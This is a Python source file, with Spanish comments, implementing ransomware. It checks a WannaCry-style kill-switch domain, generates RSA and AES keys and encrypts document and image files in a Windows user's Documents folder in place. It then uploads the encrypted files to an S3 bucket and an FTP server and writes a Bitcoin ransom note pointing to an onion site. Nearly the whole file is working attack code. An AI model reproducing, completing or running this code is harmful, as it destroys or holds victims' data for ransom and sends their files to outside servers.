import os
import requests
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import base64
import boto3
from ftplib import FTP

# Función para comprobar el kill switch
def check_kill_switch():
    try:
        response = requests.get("http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com")
        return response.status_code == 200
    except requests.RequestException:
        return False

# Función para generar una clave RSA
def generate_rsa_key_pair():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    public_key = private_key.public_key()
    return private_key, public_key

# Función para serializar la clave pública
def serialize_public_key(public_key):
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return pem

# Función para cifrar la clave AES con la clave pública RSA
def encrypt_aes_key_with_rsa(public_key, aes_key):
    encrypted_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_key

# Función para generar una clave AES
def generate_aes_key():
    key = os.urandom(32)  # Clave AES de 256 bits
    return key

# Función para cifrar archivos usando AES
def encrypt_file(aes_key, file_path):
    with open(file_path, 'rb') as f:
        data = f.read()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(data) + encryptor.finalize()
    with open(file_path, 'wb') as f:
        f.write(iv + encrypted_data)
    return file_path

# Función para recorrer directorios y cifrar archivos
def encrypt_files(aes_key, directory):
    encrypted_files = []
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(('.doc', '.xls', '.jpg', '.png', '.txt')):
                file_path = os.path.join(root, file)
                encrypted_file_path = encrypt_file(aes_key, file_path)
                encrypted_files.append(encrypted_file_path)
    return encrypted_files

# Función para subir archivo a AWS S3
def upload_to_s3(file_path, bucket_name, s3_client):
    s3_client.upload_file(file_path, bucket_name, os.path.basename(file_path))

# Función para subir archivo a un servidor FTP
def upload_to_ftp(file_path, ftp_details):
    ftp = FTP()
    ftp.connect(ftp_details['host'], ftp_details['port'])
    ftp.login(ftp_details['user'], ftp_details['passwd'])
    with open(file_path, 'rb') as f:
        ftp.storbinary('STOR ' + os.path.basename(file_path), f)
    ftp.quit()

# Función para hacer el backup de archivos encriptados
def backup_encrypted_files(encrypted_files):
    # Detalles de AWS S3
    s3_client = boto3.client('s3')
    bucket_name = 'your-s3-bucket-name'

    # Detalles del servidor FTP
    ftp_details = {
        'host': 'ftp.yourserver.com',
        'port': 21,
        'user': 'ftp_username',
        'passwd': 'ftp_password'
    }

    for file_path in encrypted_files:
        upload_to_s3(file_path, bucket_name, s3_client)
        upload_to_ftp(file_path, ftp_details)

# Función para mostrar la nota de rescate
def show_ransom_note():
    note = """
    ¡Sus archivos han sido cifrados!

    Para recuperarlos, debe pagar un rescate en Bitcoin.
    Visite el siguiente sitio web para más instrucciones:
    http://example.onion

    ¡No apague su computadora o sus archivos serán perdidos para siempre!
    """
    print(note)
    with open("README.txt", "w") as ransom_file:
        ransom_file.write(note)

# Función principal
def main():
    if check_kill_switch():
        return

    private_key, public_key = generate_rsa_key_pair()
    aes_key = generate_aes_key()
    encrypted_aes_key = encrypt_aes_key_with_rsa(public_key, aes_key)

    # Guardar la clave privada en un archivo seguro (no recomendado en código real)
    with open("private_key.pem", 'wb') as f:
        pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        f.write(pem)

    # Guardar la clave AES cifrada
    with open("encrypted_aes_key.bin", "wb") as key_file:
        key_file.write(encrypted_aes_key)

    directory = "C:\\Users\\User\\Documents"
    encrypted_files = encrypt_files(aes_key, directory)

    # Realizar el backup de los archivos cifrados
    backup_encrypted_files(encrypted_files)

    # Mostrar la nota de rescate
    show_ransom_note()

if __name__ == "__main__":
    main()
